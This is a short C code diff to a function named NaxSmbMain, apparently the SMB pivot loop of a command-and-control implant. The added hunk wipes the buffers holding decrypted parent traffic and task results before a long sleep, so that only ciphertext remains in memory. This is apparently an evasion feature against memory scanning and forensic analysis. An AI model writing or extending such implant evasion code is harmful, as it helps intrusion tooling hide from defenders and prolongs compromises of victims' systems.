@@ -444,6 +444,15 @@ FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax ) {
                 wfmo_timeout = sleepMs ? sleepMs : INFINITE;
                 idleWait     = TRUE;
             }
+
+            /* W0.7: wipe decrypted parent traffic and task-result plaintext
+             * before the long dwell wait.  io/env hold ciphertext only. */
+            if ( wfmo_timeout > 100 ) {
+                MmZero( plain_buf, IO_CAP );
+                MmZero( result_buf, RESULT_CAP );
+                MmZero( frame_buf, FRAME_CAP );
+            }
+
             DWORD  wait = Nax->Kernel32.WaitForMultipleObjects( handleCount, waitHandles, FALSE, wfmo_timeout );
 
             if ( wait == WAIT_OBJECT_0 ) {
